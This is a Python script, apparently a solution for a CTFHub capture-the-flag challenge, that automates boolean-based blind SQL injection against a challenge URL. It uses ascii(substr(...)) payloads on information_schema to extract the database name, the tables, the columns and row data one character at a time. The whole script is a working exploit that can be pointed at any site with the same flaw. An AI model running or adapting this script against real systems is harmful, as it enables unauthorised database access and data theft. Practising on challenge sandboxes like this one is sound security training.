import requests

url='http://challenge-9b3fe095f90fd02d.sandbox.ctfhub.com:10080/?id={}'

# ---------设置payload（默认数字型注入）---------
Get_db_payload="1 and ascii(substr(database(),{},{}))={} %23"
Get_table_payload="1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},{}),{},{}))={} %23"
Get_columns_payload="1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='{}' limit {},{}),{},{}))={} %23"
Get_dump_payload="1 and ascii(substr((select {} from {} limit {},{}),{},1))={} %23"
# ----------------------------------------------

# ---------设置返回正确页面提示，和header--------
if_data='query_success'
key=['{','}', '@', '_',',','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
headers={}
# ----------------------------------------------


def Get_db():
    db_text,num,_='',1,""
    while 1:
        for i in key:
            _=db_text   #temp变量相当于记录上一轮的值，如果判断和这轮相等，那么就return，这样就不用获取数据库长度了。
            payload=Get_db_payload.format(num,1,ord(i))
            t=requests.get(url.format(payload))
            if if_data in t.text:
                db_text+=i
                num+=1
                break
        if db_text==_:
            return db_text
        print('out:'+db_text)


def Get_table():
    tables=[]
    for num_biao in range(1,9999999):
        tables.append('')
        last=''
        for ranking_biao in range(1,99999999):
            for i in key:
                last=tables[num_biao-1]
                payload=Get_table_payload.format(num_biao-1,num_biao,ranking_biao,1,ord(i))
                t=requests.get(url.format(payload))
                if if_data in t.text:
                    tables[num_biao-1]+=i
                    break
            if last==tables[num_biao-1]:
                break
        if tables[num_biao-1]=='':
            tables.pop()
            return tables
        print('out:'+tables[num_biao-1])


def Get_columns(table):
    columns=[]
    for columns_num in range(1,999999):
        columns.append('')
        last=''
        for columns_ranking in range(1,999999):
            for i in key:
                last=columns[columns_num-1]
                payload=Get_columns_payload.format(table,columns_num-1,1,columns_ranking,1,ord(i))
                # print(payload)
                t=requests.get(url.format(payload))
                # print(t.url)
                if if_data in t.text:
                    columns[columns_num-1]+=i
                    break
                # print(columns[columns_num-1])
            if last==columns[columns_num-1]:
                break
        if columns[columns_num-1]=='':
            columns.pop()
            return columns
        print(columns[columns_num-1])


def Get_dump(column,table):
    data=[]
    for i in range(1,999999):
        data.append('')
        temp=''
        for j in range(1,999999):
            for k in key:
                temp=data[i-1]
                payload=Get_dump_payload.format(column,table,i-1,1,j,ord(k))
                t=requests.get(url.format(payload))
                if if_data in t.text:
                    data[i-1]+=k
                    break
            if temp==data[i-1]:
                break
            print(data[i-1])
        if data[i-1]=='':
            data.pop()
            return data
        print(data[i-1])


if __name__ == "__main__":
    Get_db()
    Get_table()
